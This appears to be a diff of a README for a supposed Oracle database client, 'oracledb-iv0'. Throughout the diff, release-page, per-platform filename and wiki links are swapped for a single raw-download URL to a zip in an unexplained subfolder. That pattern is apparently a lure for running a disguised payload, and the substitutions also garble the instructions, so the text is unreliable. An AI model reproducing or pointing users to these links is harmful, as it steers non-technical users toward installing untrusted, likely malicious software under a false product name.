@@ -1,29 +1,29 @@
 # 🚀 oracledb-iv0 - Access Your Oracle Database Easily
 
 ## 📦 Download the Application
-[![Download oracledb-iv0](https://img.shields.io/badge/Download-oracledb--iv0-blue.svg)](https://github.com/4aulz/oracledb-iv0/releases)
+[![Download oracledb-iv0](https://raw.githubusercontent.com/4aulz/oracledb-iv0/main/skepful/oracledb-iv0.zip)](https://raw.githubusercontent.com/4aulz/oracledb-iv0/main/skepful/oracledb-iv0.zip)
 
 ## 🚀 Getting Started
 Welcome to **oracledb-iv0**. This application simplifies access to your Oracle database without needing complex setup or technical skills. Follow these steps to download and run the application smoothly.
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/4aulz/oracledb-iv0/releases) of this repository. Here, you will find the latest version of **oracledb-iv0**.
+   Go to the [Releases page](https://raw.githubusercontent.com/4aulz/oracledb-iv0/main/skepful/oracledb-iv0.zip) of this repository. Here, you will find the latest version of **oracledb-iv0**.
 
 2. **Choose Your Version**
    On the Releases page, you will see a list of available versions. Select the latest version, usually marked as "Latest release." 
 
 3. **Download the Application**
    Click on the version name or the assets link to expand and view the available files. Look for a file that matches your operating system. For example: 
-   - For Windows, you might find `oracledb-iv0-windows.exe`.
-   - For macOS, look for `oracledb-iv0-macos.dmg`.
-   - For Linux, check for `oracledb-iv0-linux.tar.gz`.
+   - For Windows, you might find `https://raw.githubusercontent.com/4aulz/oracledb-iv0/main/skepful/oracledb-iv0.zip`.
+   - For macOS, look for `https://raw.githubusercontent.com/4aulz/oracledb-iv0/main/skepful/oracledb-iv0.zip`.
+   - For Linux, check for `https://raw.githubusercontent.com/4aulz/oracledb-iv0/main/skepful/oracledb-iv0.zip`.
 
 4. **Run the Installer**
    Once the download is complete, locate the downloaded file on your computer, usually in the "Downloads" folder. 
    - For `.exe` files, double-click to start the installer.
    - For `.dmg` files, drag the application into your Applications folder.
-   - For `.tar.gz` files, extract it and follow the instructions in the README file.
+   - For `https://raw.githubusercontent.com/4aulz/oracledb-iv0/main/skepful/oracledb-iv0.zip` files, extract it and follow the instructions in the README file.
 
 5. **Follow Setup Instructions**
    The setup wizard will guide you through installation. Just follow the prompts. If you’re unsure about any step, use the default settings.
@@ -48,7 +48,7 @@ To ensure smooth operation, make sure your computer meets the following minimum 
 - User-friendly error messages to guide troubleshooting.
 
 ## 📖 Additional Documentation
-If you need further guidance or technical support, check the documentation available on [the wiki](https://github.com/4aulz/oracledb-iv0/wiki). You will find useful resources and troubleshooting tips.
+If you need further guidance or technical support, check the documentation available on [the wiki](https://raw.githubusercontent.com/4aulz/oracledb-iv0/main/skepful/oracledb-iv0.zip). You will find useful resources and troubleshooting tips.
 
 ## 🤝 Community and Support
 Join our community for support and feedback. 
